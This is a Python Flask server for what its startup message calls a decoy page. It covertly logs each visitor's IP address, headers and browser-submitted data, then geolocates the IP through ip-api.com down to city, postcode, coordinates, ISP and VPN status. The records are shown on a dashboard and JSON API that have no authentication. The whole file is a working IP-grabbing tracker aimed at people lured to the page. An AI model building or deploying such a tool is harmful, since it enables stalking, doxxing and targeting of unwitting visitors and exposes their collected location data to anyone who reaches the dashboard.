from flask import Flask, request, jsonify, send_from_directory
import json, os, datetime, urllib.request, threading

app = Flask(__name__)
BASE = os.path.dirname(os.path.abspath(__file__))
LOG  = os.path.join(BASE, "registros.json")

_lock = threading.Lock()

def guardar(entrada):
    with _lock:
        registros = []
        if os.path.exists(LOG):
            with open(LOG, encoding="utf-8") as f:
                try: registros = json.load(f)
                except Exception: pass
        registros.append(entrada)
        with open(LOG, "w", encoding="utf-8") as f:
            json.dump(registros, f, indent=2, ensure_ascii=False)

def geoip(ip):
    """Consulta ip-api.com y devuelve un dict con todos los campos útiles."""
    # IPs locales no tienen datos públicos
    if ip in ("127.0.0.1", "::1") or ip.startswith("192.168.") or ip.startswith("10."):
        return {"geo_nota": "IP local/privada — sin datos de geolocalización publica"}
    try:
        campos = "status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,mobile,proxy,hosting,query"
        url = f"http://ip-api.com/json/{ip}?fields={campos}&lang=es"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=5) as r:
            data = json.loads(r.read())
        if data.get("status") == "success":
            return {
                "geo_pais":        data.get("country"),
                "geo_codigo_pais": data.get("countryCode"),
                "geo_region":      data.get("regionName"),
                "geo_ciudad":      data.get("city"),
                "geo_cp":          data.get("zip"),
                "geo_lat":         data.get("lat"),
                "geo_lon":         data.get("lon"),
                "geo_maps":        f"https://maps.google.com/?q={data.get('lat')},{data.get('lon')}",
                "geo_zona_horaria":data.get("timezone"),
                "geo_utc_offset":  data.get("offset"),
                "geo_moneda":      data.get("currency"),
                "geo_isp":         data.get("isp"),
                "geo_org":         data.get("org"),
                "geo_as":          data.get("as"),
                "geo_as_nombre":   data.get("asname"),
                "geo_movil":       data.get("mobile"),
                "geo_proxy_vpn":   data.get("proxy"),
                "geo_hosting":     data.get("hosting"),
            }
        return {"geo_nota": "Sin datos (" + data.get("message", "error") + ")"}
    except Exception as e:
        return {"geo_nota": "Error GeoIP: " + str(e)}

def enriquecer_y_guardar(base):
    """Añade datos GeoIP y guarda. Se llama en hilo separado."""
    geo = geoip(base.get("ip", ""))
    base.update(geo)
    guardar(base)

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    entrada = {
        "origen":       "server",
        "timestamp":    datetime.datetime.now().isoformat(),
        "ip":           ip,
        "user_agent":   request.user_agent.string,
        "referer":      request.referrer,
        "accept_lang":  request.headers.get("Accept-Language"),
        "accept_enc":   request.headers.get("Accept-Encoding"),
        "dnt":          request.headers.get("DNT"),          # Do Not Track
        "sec_fetch":    request.headers.get("Sec-Fetch-Site"),
    }
    threading.Thread(target=enriquecer_y_guardar, args=(entrada,), daemon=True).start()
    return send_from_directory(BASE, "pagina.html")

@app.route("/recolectar", methods=["POST"])
def recolectar():
    datos = request.get_json(silent=True) or {}
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    datos["ip"]        = ip
    datos["timestamp"] = datetime.datetime.now().isoformat()
    datos["origen"]    = "browser"
    # GeoIP en hilo para no bloquear la respuesta
    threading.Thread(target=enriquecer_y_guardar, args=(datos,), daemon=True).start()
    return jsonify({"ok": True})

@app.route("/dashboard")
def dashboard():
    try:
        ruta = os.path.join(BASE, "dashboard.html")
        with open(ruta, encoding="utf-8") as f:
            contenido = f.read()
        return contenido, 200, {"Content-Type": "text/html; charset=utf-8"}
    except Exception as e:
        return "Error: " + str(e), 500

@app.route("/api/registros")
def api_registros():
    if not os.path.exists(LOG):
        return jsonify([])
    with open(LOG, encoding="utf-8") as f:
        try: datos = json.load(f)
        except Exception: datos = []
    return jsonify(datos)

@app.route("/limpiar", methods=["POST"])
def limpiar():
    if os.path.exists(LOG):
        os.remove(LOG)
    return jsonify({"ok": True})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print("Pagina senuelo -> http://localhost:" + str(port))
    print("Panel control  -> http://localhost:" + str(port) + "/dashboard")
    app.run(debug=False, host="0.0.0.0", port=port)
